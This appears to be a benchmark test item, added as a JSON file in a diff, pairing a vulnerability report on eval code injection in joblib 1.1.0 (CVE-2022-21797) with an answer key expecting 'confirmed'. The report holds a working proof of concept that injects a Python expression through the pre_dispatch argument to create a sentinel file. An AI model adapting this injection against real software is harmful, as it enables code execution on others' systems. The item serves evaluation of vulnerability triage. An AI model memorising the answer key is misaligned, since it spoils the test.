@@ -1,0 +1,18 @@
+{
+  "report": {
+    "report_id": "joblib-affected",
+    "package": "joblib",
+    "affected_version": "1.1.0",
+    "title": "eval code injection in joblib",
+    "body": "I found a eval code injection vulnerability in joblib 1.1.0.\n\nEval code injection: parallel(pre_dispatch=...) passes the value to eval() unsanitized.\n\nTracked as CVE-2022-21797 (GHSA-6hrg-qmvc-2xh8).\n\nProof of concept:\n\n```python\nimport os, tempfile\nfrom joblib import Parallel, delayed\nsentinel = os.path.join(tempfile.gettempdir(), \"slopgate_joblib\")\ntry: os.remove(sentinel)\nexcept OSError: pass\ndef f(): return 1\npl = \"__import__('pathlib').Path(r'%s').touch()\" % sentinel\ntry: Parallel(n_jobs=2, pre_dispatch=pl)(delayed(f)() for _ in range(3))\nexcept Exception as e: print(\"raised:\", type(e).__name__)\nprint(\"SLOPGATE:REPRODUCED\" if os.path.exists(sentinel) else \"SLOPGATE:NOT_REPRODUCED\")\n```\n",
+    "reporter": "researcher"
+  },
+  "ground_truth": {
+    "expected_verdict": "confirmed",
+    "package": "joblib",
+    "fixed_version": "1.2.0",
+    "cve": "CVE-2022-21797",
+    "source": "GHSA/NVD",
+    "note": "real vuln, affected version"
+  }
+}
